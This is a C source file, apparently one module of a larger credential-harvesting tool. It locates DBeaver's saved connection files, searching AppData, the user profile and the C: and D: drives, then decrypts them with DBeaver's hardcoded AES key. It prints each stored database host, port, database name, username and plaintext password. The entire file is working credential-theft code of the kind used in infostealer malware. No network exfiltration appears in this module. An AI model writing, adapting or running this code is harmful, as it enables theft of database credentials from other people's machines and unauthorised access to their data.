/* DBeaver credential extraction with global search */
#include "dbeaver.h"
#include "browser/utils.h"
#include "browser/crypto.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <windows.h>
#include <shlobj.h>

static const char* KEY_HEX = "babb4a9f774ab853c96c2d653dfe544a";
static const char* IV_HEX  = "00000000000000000000000000000000";

static const char* find_in_range(const char* start, const char* end, const char* needle) {
    size_t nl = strlen(needle);
    if (!start || !needle || nl == 0) return NULL;
    if (!end) return strstr(start, needle);
    for (const char* p = start; p + nl <= end; p++)
        if (memcmp(p, needle, nl) == 0) return p;
    return NULL;
}

static const char* json_object_end(const char* obj) {
    int depth = 0, in_str = 0, esc = 0;
    for (const char* p = obj; *p; p++) {
        char c = *p;
        if (in_str) {
            if (esc) esc = 0;
            else if (c == '\\') esc = 1;
            else if (c == '"') in_str = 0;
            continue;
        }
        if (c == '"') in_str = 1;
        else if (c == '{') depth++;
        else if (c == '}' && --depth == 0) return p + 1;
    }
    return NULL;
}

static const char* json_object_start_at(const char* json, const char* pos) {
    const char* stack[128];
    int depth = 0, in_str = 0, esc = 0;
    for (const char* p = json; *p && p < pos; p++) {
        char c = *p;
        if (in_str) {
            if (esc) esc = 0;
            else if (c == '\\') esc = 1;
            else if (c == '"') in_str = 0;
            continue;
        }
        if (c == '"') in_str = 1;
        else if (c == '{') {
            if (depth < (int)(sizeof(stack) / sizeof(stack[0]))) stack[depth++] = p;
        } else if (c == '}' && depth > 0) {
            depth--;
        }
    }
    return depth > 0 ? stack[depth - 1] : NULL;
}

static int json_key_before_object(const char* json, const char* object_start, char* out, int out_size) {
    if (!json || !object_start || !out || out_size <= 0) return 0;
    const char* p = object_start;
    while (p > json) {
        p--;
        if (!isspace((unsigned char)*p) && *p != ':') break;
    }
    if (*p != '"') return 0;
    const char* end = p;
    p--;
    while (p > json) {
        if (*p == '"' && p[-1] != '\\') break;
        p--;
    }
    if (*p != '"' || end <= p + 1) return 0;
    int n = (int)(end - p - 1);
    if (n >= out_size) n = out_size - 1;
    memcpy(out, p + 1, n);
    out[n] = 0;
    return n > 0;
}

static int json_get_value(const char* start, const char* end, const char* key, char* out, int out_size) {
    if (!start || !key || !out || out_size <= 0) return 0;
    char pat[128]; snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char* p = find_in_range(start, end, pat);
    if (!p) return 0;
    p += strlen(pat);
    const char* colon = find_in_range(p, end, ":");
    if (!colon) return 0;
    p = colon + 1;
    while ((!end || p < end) && (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n')) p++;
    int n = 0;
    if (*p == '"') {
        p++;
        while ((!end || p < end) && *p && *p != '"' && n < out_size - 1) {
            if (*p == '\\' && p[1]) p++;
            out[n++] = *p++;
        }
    } else {
        while ((!end || p < end) && *p && *p != ',' && *p != '}' && !isspace((unsigned char)*p) && n < out_size - 1)
            out[n++] = *p++;
    }
    out[n] = 0;
    return n > 0;
}

static const char* json_find_object_by_key(const char* json, const char* key) {
    if (!json || !key || !*key) return NULL;

    char pat[512];
    snprintf(pat, sizeof(pat), "\"%s\"", key);

    const char* p = json;
    while ((p = strstr(p, pat)) != NULL) {
        const char* q = p + strlen(pat);
        while (*q && isspace((unsigned char)*q)) q++;
        if (*q != ':') {
            p = q;
            continue;
        }
        q++;
        while (*q && isspace((unsigned char)*q)) q++;
        if (*q == '{') return q;
        p = q;
    }

    return NULL;
}

static void parse_jdbc_url(const char* url, char* host, int hs, char* port, int ps, char* db, int ds) {
    if (!url || !url[0]) return;
    const char* p = strstr(url, "://");
    if (p) p += 3;
    else {
        p = strstr(url, "jdbc:");
        if (p) {
            p += 5;
            const char* c = strchr(p, ':');
            if (c) p = c + 1;
            while (*p == '/') p++;
        } else p = url;
    }
    while (*p == '/') p++;
    const char* h = p;
    while (*p && *p != ':' && *p != '/' && *p != ';' && *p != '?') p++;
    if (p > h && hs > 0) {
        int n = (int)(p - h); if (n >= hs) n = hs - 1;
        memcpy(host, h, n); host[n] = 0;
    }
    if (*p == ':') {
        p++;
        const char* pp = p;
        while (*p && isdigit((unsigned char)*p)) p++;
        if (p > pp && ps > 0) {
            int n = (int)(p - pp); if (n >= ps) n = ps - 1;
            memcpy(port, pp, n); port[n] = 0;
        }
    }
    if (*p == '/') {
        p++;
        const char* d = p;
        while (*p && *p != '?' && *p != ';' && *p != '&') p++;
        if (p > d && ds > 0) {
            int n = (int)(p - d); if (n >= ds) n = ds - 1;
            memcpy(db, d, n); db[n] = 0;
        }
    }
    const char* params[] = {"databaseName=", "database=", "Database=", "SID=", "serviceName=", NULL};
    for (int i = 0; params[i] && (!db || !db[0]); i++) {
        const char* q = strstr(url, params[i]);
        if (!q) continue;
        q += strlen(params[i]);
        const char* e = q;
        while (*e && *e != ';' && *e != '&' && *e != '?' && *e != '/') e++;
        int n = (int)(e - q); if (n >= ds) n = ds - 1;
        if (n > 0) { memcpy(db, q, n); db[n] = 0; }
    }
}

const char* dbeaver_scan(const char* config_path, const char* sources_path) {
    static char result[65536]; int rp = 0; result[0] = 0;
    char cred_path[MAX_PATH] = {0};
    char src_path[MAX_PATH] = {0};

    /* 1. Use explicitly provided paths */
    if (config_path && config_path[0]) strncpy(cred_path, config_path, sizeof(cred_path)-1);
    if (sources_path && sources_path[0]) strncpy(src_path, sources_path, sizeof(src_path)-1);

    /* 2. Check default path */
    if (!cred_path[0] || !src_path[0]) {
        char appdata[MAX_PATH];
        if (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata)))
            GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));

        /* Search for workspace* directories */
        bool dbeaver_seen = false;
        char dbeaver_base[MAX_PATH];
        snprintf(dbeaver_base, sizeof(dbeaver_base), "%s\\DBeaverData", appdata);
        if (path_exists(dbeaver_base) || process_exists("dbeaver.exe")) dbeaver_seen = true;
        if (path_exists(dbeaver_base)) {
            char ws_search[MAX_PATH];
            snprintf(ws_search, sizeof(ws_search), "%s\\*", dbeaver_base);
            WIN32_FIND_DATAA fd;
            HANDLE hf = FindFirstFileA(ws_search, &fd);
            if (hf != INVALID_HANDLE_VALUE) {
                do {
                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                    if (strncmp(fd.cFileName, "workspace", 9) != 0) continue;
                    char cpath[MAX_PATH], spath[MAX_PATH];
                    snprintf(cpath, sizeof(cpath), "%s\\%s\\General\\.dbeaver\\credentials-config.json", dbeaver_base, fd.cFileName);
                    snprintf(spath, sizeof(spath), "%s\\%s\\General\\.dbeaver\\data-sources.json", dbeaver_base, fd.cFileName);
                    if (path_exists(cpath) && !cred_path[0]) strncpy(cred_path, cpath, sizeof(cred_path)-1);
                    if (path_exists(spath) && !src_path[0]) strncpy(src_path, spath, sizeof(src_path)-1);
                } while (FindNextFileA(hf, &fd));
                FindClose(hf);
            }
        }

        /* 3. Search recursively only after DBeaver evidence exists. */
        if (dbeaver_seen && !cred_path[0]) {
            char* found = find_file_recursive(appdata, "credentials-config.json", 5);
            if (found) { strncpy(cred_path, found, sizeof(cred_path)-1); free(found); }
        }
        if (dbeaver_seen && !src_path[0]) {
            char* found = find_file_recursive(appdata, "data-sources.json", 5);
            if (found) { strncpy(src_path, found, sizeof(src_path)-1); free(found); }
        }

        /* Link: both files always live in the same .dbeaver directory —
         * deriving one from the other avoids separate depth-5 trees. */
        if (cred_path[0] && !src_path[0]) {
            char* slash = strrchr(cred_path, '\\');
            if (slash) snprintf(src_path, sizeof(src_path), "%.*s\\data-sources.json", (int)(slash - cred_path), cred_path);
        }
        if (src_path[0] && !cred_path[0]) {
            char* slash = strrchr(src_path, '\\');
            if (slash) snprintf(cred_path, sizeof(cred_path), "%.*s\\credentials-config.json", (int)(slash - src_path), src_path);
        }

        /* 4. Search user profile only after DBeaver evidence exists. */
        if (dbeaver_seen && (!cred_path[0] || !src_path[0])) {
            char userprof[MAX_PATH];
            GetEnvironmentVariableA("USERPROFILE", userprof, sizeof(userprof));
            if (!cred_path[0]) {
                char* found = find_file_recursive(userprof, "credentials-config.json", 5);
                if (found) { strncpy(cred_path, found, sizeof(cred_path)-1); free(found); }
            }
            if (!src_path[0]) {
                char* found = find_file_recursive(userprof, "data-sources.json", 5);
                if (found) { strncpy(src_path, found, sizeof(src_path)-1); free(found); }
            }
        }

        /* 5. Search C: and D: only after DBeaver evidence exists. */
        if (dbeaver_seen) {
            const char* drives[] = {"C:\\", "D:\\", NULL};
            for (int di = 0; drives[di] && (!cred_path[0] || !src_path[0]); di++) {
                if (!cred_path[0]) {
                    char* found = find_file_recursive(drives[di], "credentials-config.json", 5);
                    if (found) { strncpy(cred_path, found, sizeof(cred_path)-1); free(found); }
                }
                if (!src_path[0]) {
                    char* found = find_file_recursive(drives[di], "data-sources.json", 5);
                    if (found) { strncpy(src_path, found, sizeof(src_path)-1); free(found); }
                }
            }
        }
    }

    if (!cred_path[0] || !path_exists(cred_path)) {
        snprintf(result, sizeof(result), "credentials-config.json not found. Searched default paths, AppData, and UserProfile.\n");
        return result;
    }
    if (!src_path[0] || !path_exists(src_path)) {
        snprintf(result, sizeof(result), "data-sources.json not found.\n");
        return result;
    }

    /* Decrypt and parse */
    FILE* f = fopen(cred_path, "rb"); if (!f) return "";
    fseek(f, 0, SEEK_END); long el = ftell(f); fseek(f, 0, SEEK_SET);
    if (el <= 0 || el > 1048576) { fclose(f); return ""; }
    char* ed = (char*)malloc(el + 1);
    if (!ed || fread(ed, 1, el, f) != (size_t)el) { free(ed); fclose(f); return ""; }
    ed[el] = 0; fclose(f);

    uint8_t key[16], iv[16];
    hex_decode(KEY_HEX, key, 16); hex_decode(IV_HEX, iv, 16);

    uint8_t* dc = (uint8_t*)malloc(el + 16); int dl;
    if (aes128_cbc_decrypt(key, iv, (uint8_t*)ed, el, dc, &dl) != 0) { free(ed); free(dc); return ""; }
    free(ed);
    char* plain = (char*)malloc(dl + 1);
    memcpy(plain, dc, dl); plain[dl] = 0; free(dc);

    /* Read data-sources */
    f = fopen(src_path, "rb"); if (!f) { free(plain); return ""; }
    fseek(f, 0, SEEK_END); long sl = ftell(f); fseek(f, 0, SEEK_SET);
    char* src = (char*)malloc(sl + 1);
    if (!src || fread(src, 1, sl, f) != (size_t)sl) { free(src); fclose(f); free(plain); return ""; }
    src[sl] = 0; fclose(f);

    /* Extract credentials */
    const char* p = plain;
    int found_count = 0;
    while ((p = strstr(p, "\"#connection\"")) != NULL) {
        const char* creds_obj = json_object_start_at(plain, p);
        if (!creds_obj) { p++; continue; }
        const char* creds_end = json_object_end(creds_obj);
        if (!creds_end) { p++; continue; }

        char ckey[256] = {0};
        if (!json_key_before_object(plain, creds_obj, ckey, sizeof(ckey))) {
            p = creds_end;
            continue;
        }

        char user[256] = {0}, pw[512] = {0};
        json_get_value(creds_obj, creds_end, "user", user, sizeof(user));
        json_get_value(creds_obj, creds_end, "password", pw, sizeof(pw));

        char host[512] = "unknown", port[64] = "", db[256] = "";
        const char* src_obj = json_find_object_by_key(src, ckey);
        if (src_obj) {
            const char* src_end = json_object_end(src_obj);
            const char* cfg_obj = json_find_object_by_key(src_obj, "configuration");
            const char* cfg_end = cfg_obj ? json_object_end(cfg_obj) : NULL;
            const char* props_obj = json_find_object_by_key(src_obj, "properties");
            const char* props_end = props_obj ? json_object_end(props_obj) : NULL;
            char url[1024] = "", tmp[512] = "";

            if (!(cfg_obj && json_get_value(cfg_obj, cfg_end, "host", host, sizeof(host))) &&
                !(cfg_obj && json_get_value(cfg_obj, cfg_end, "server", host, sizeof(host))) &&
                !(props_obj && json_get_value(props_obj, props_end, "host", host, sizeof(host))) &&
                !(props_obj && json_get_value(props_obj, props_end, "server", host, sizeof(host)))) {
                json_get_value(src_obj, src_end, "host", host, sizeof(host));
                json_get_value(src_obj, src_end, "server", host, sizeof(host));
            }

            if ((cfg_obj && (json_get_value(cfg_obj, cfg_end, "url", url, sizeof(url)) ||
                             json_get_value(cfg_obj, cfg_end, "jdbcUrl", url, sizeof(url)))) ||
                (props_obj && (json_get_value(props_obj, props_end, "url", url, sizeof(url)) ||
                               json_get_value(props_obj, props_end, "jdbcUrl", url, sizeof(url)))) ||
                json_get_value(src_obj, src_end, "url", url, sizeof(url)) ||
                json_get_value(src_obj, src_end, "jdbcUrl", url, sizeof(url))) {
                parse_jdbc_url(url, host, sizeof(host), port, sizeof(port), db, sizeof(db));
            }

            if ((cfg_obj && (json_get_value(cfg_obj, cfg_end, "port", tmp, sizeof(tmp)) ||
                             json_get_value(cfg_obj, cfg_end, "serverPort", tmp, sizeof(tmp)))) ||
                (props_obj && (json_get_value(props_obj, props_end, "port", tmp, sizeof(tmp)) ||
                               json_get_value(props_obj, props_end, "serverPort", tmp, sizeof(tmp)))) ||
                json_get_value(src_obj, src_end, "port", tmp, sizeof(tmp)) ||
                json_get_value(src_obj, src_end, "serverPort", tmp, sizeof(tmp))) {
                strncpy(port, tmp, sizeof(port)-1);
            }

            if ((cfg_obj && (json_get_value(cfg_obj, cfg_end, "database", tmp, sizeof(tmp)) ||
                             json_get_value(cfg_obj, cfg_end, "databaseName", tmp, sizeof(tmp)) ||
                             json_get_value(cfg_obj, cfg_end, "sid", tmp, sizeof(tmp)) ||
                             json_get_value(cfg_obj, cfg_end, "service", tmp, sizeof(tmp)))) ||
                (props_obj && (json_get_value(props_obj, props_end, "database", tmp, sizeof(tmp)) ||
                               json_get_value(props_obj, props_end, "databaseName", tmp, sizeof(tmp)) ||
                               json_get_value(props_obj, props_end, "sid", tmp, sizeof(tmp)) ||
                               json_get_value(props_obj, props_end, "service", tmp, sizeof(tmp)))) ||
                json_get_value(src_obj, src_end, "database", tmp, sizeof(tmp)) ||
                json_get_value(src_obj, src_end, "databaseName", tmp, sizeof(tmp)) ||
                json_get_value(src_obj, src_end, "sid", tmp, sizeof(tmp)) ||
                json_get_value(src_obj, src_end, "service", tmp, sizeof(tmp))) {
                strncpy(db, tmp, sizeof(db)-1);
            }

            if (host[0] == 0 || strcmp(host, "unknown") == 0 || host[0] == '/' || strcmp(host, "localhost") == 0) {
                char h2[512] = "";
                if ((cfg_obj && (json_get_value(cfg_obj, cfg_end, "serverHost", h2, sizeof(h2)) ||
                                 json_get_value(cfg_obj, cfg_end, "hostName", h2, sizeof(h2)))) ||
                    (props_obj && (json_get_value(props_obj, props_end, "serverHost", h2, sizeof(h2)) ||
                                   json_get_value(props_obj, props_end, "hostName", h2, sizeof(h2)))) ||
                    json_get_value(src_obj, src_end, "serverHost", h2, sizeof(h2)) ||
                    json_get_value(src_obj, src_end, "hostName", h2, sizeof(h2))) {
                    strncpy(host, h2, sizeof(host)-1);
                }
            }
        }

        rp += snprintf(result + rp, sizeof(result) - rp,
            "host: %s\nport: %s\ndatabase: %s\nusername: %s\npassword: %s\n\n",
            host[0] ? host : "unknown", port[0] ? port : "unknown", db[0] ? db : "unknown", user, pw);
        found_count++;
        p = creds_end;
    }

    free(plain); free(src);
    if (!found_count) snprintf(result+strlen(result), sizeof(result)-strlen(result), "No connections found in config.\n");
    return result;
}
